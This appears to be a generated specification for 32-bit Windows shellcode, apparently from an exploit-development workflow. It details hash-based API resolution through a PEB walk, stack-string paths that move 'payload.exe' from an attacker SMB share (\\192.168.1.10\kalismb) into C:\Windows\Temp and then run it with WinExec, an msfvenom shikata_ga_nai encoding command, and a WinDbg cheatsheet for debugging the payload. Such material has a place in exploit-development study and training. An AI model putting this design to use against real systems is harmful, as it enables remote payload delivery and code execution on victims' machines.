# Shellcode Contract

Generated from manifest.

---

# Stack Layout

Frame: `mov ebp, esp` / `sub esp, 0x100` (0x100 bytes reserved)

## Export Context (reserved - do not allocate)

| Offset | Description |
|--------|-------------|
| `[ebp-0x04]` | Module base (transient) |
| `[ebp-0x08]` | AddressOfNames VA |
| `[ebp-0x0c]` | AddressOfNameOrdinals VA |
| `[ebp-0x10]` | AddressOfFunctions VA |
| `[ebp-0x14]` | NumberOfNames |
| `[ebp-0x18]` | Target hash (transient) |

## Module Bases

| Offset | Module |
|--------|--------|
| `[ebp-0x20]` | kernel32.dll |

## API Table

| Offset | API | Module |
|--------|-----|--------|
| `[ebp-0x24]` | MoveFileA | kernel32.dll |
| `[ebp-0x28]` | WinExec | kernel32.dll |
| `[ebp-0x2c]` | ExitProcess | kernel32.dll |

## Variables

| Offset | Variable | Size |
|--------|----------|------|
| `[ebp-0x30]` | move_ret | 4 |
| `[ebp-0x34]` | exec_ret | 4 |

## Structures

_No structures._

## Strings

| Offset | Label | Value | Size |
|--------|-------|-------|------|
| `[ebp-0xa4]` | src_path | \\192.168.1.10\kalismb\payload.exe | 36 |
| `[ebp-0xc0]` | dst_path | C:\Windows\Temp\payload.exe | 28 |

---

# API Contracts

## kernel32.dll

Resolution: PEB walk

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| MoveFileA | `0xa4048954` | `[ebp-0x24]` | filesystem |
| WinExec | `0x0e8afe98` | `[ebp-0x28]` | process |
| ExitProcess | `0x73e2d87e` | `[ebp-0x2c]` | process |

### API Details

#### MoveFileA

**Slot:** `[ebp-0x24]`
**Hash:** `0xa4048954`
**Module:** kernel32.dll
**Category:** filesystem

```c
BOOL MoveFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpExistingFileName | LPCSTR |  |
| 2 | lpNewFileName | LPCSTR |  |

---

#### WinExec

**Slot:** `[ebp-0x28]`
**Hash:** `0x0e8afe98`
**Module:** kernel32.dll
**Category:** process

```c
UINT WinExec(LPCSTR lpCmdLine, UINT uCmdShow)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpCmdLine | LPCSTR | pointer to command string, e.g. cmd.exe |
| 2 | uCmdShow | UINT | SW_SHOWNORMAL = 1 or SW_HIDE = 0 |

---

#### ExitProcess

**Slot:** `[ebp-0x2c]`
**Hash:** `0x73e2d87e`
**Module:** kernel32.dll
**Category:** process

```c
VOID ExitProcess(UINT uExitCode)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | uExitCode | UINT | 0 for clean exit |

---

---

# Structure Layouts

---

# Operational Cheatsheet

**Template:** IRMoveThenRunTemplate
**Target:** `127.0.0.1:4444`
**Bad characters:** `0x00` `0x0a` `0x0d`

## Setup Commands

**Source path (moved, not copied):**
```
\\192.168.1.10\kalismb\payload.exe
```

**Destination path (also executed):**
```
C:\Windows\Temp\payload.exe
```

## Encoding (if needed)

Remove bad chars with msfvenom (requires `shellcode.bin`):
```
cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python -v shellcode
```

---

# WinDbg Cheatsheet

Run `debug_runner.py` under 32-bit Python. Attach WinDbg to the
python.exe process. Set `bp <address>` using the printed shellcode
address, then press Enter in the script to start execution.

## Quick Reference

| Command | Description |
|---------|-------------|
| `bp <addr>` | Set breakpoint |
| `bl` | List breakpoints |
| `g` | Go (continue) |
| `t` | Step into |
| `p` | Step over |
| `pt` | Step to next return |
| `r` | Show all registers |
| `r eax` | Show one register |
| `u eip L10` | Disassemble next 16 instructions |
| `db <addr> L<n>` | Dump bytes |
| `dd <addr> L<n>` | Dump dwords |
| `da <addr>` | Dump ASCII string |
| `!address <addr>` | Show memory region info |

## Inspect API Pointers After Resolution

After the PEB walk and hash resolution, each resolved function
pointer is stored at its stack slot. Verify with:

```
dd ebp-0x24 L1    ; MoveFileA
dd ebp-0x28 L1    ; WinExec
dd ebp-0x2c L1    ; ExitProcess
```

## Inspect Structures Before API Calls

## Inspect Stack Strings

```
da ebp-0xa4    ; src_path
```

```
da ebp-0xc0    ; dst_path
```

## Breakpoint Strategy

Set breakpoints at each `call [ebp-0xNN]` in the generated
assembly to pause before each API call. After each call, check
`eax` for the return value:

```
bp <sc_base>+<offset_of_call_MoveFileA>
bp <sc_base>+<offset_of_call_WinExec>  ; eax>31 on success
bp <sc_base>+<offset_of_call_ExitProcess>  ; does not return
```

Find the call offsets by searching `generated.asm` for
`call [ebp-` instructions. Add the instruction's line offset
from the start of the shellcode to the base address.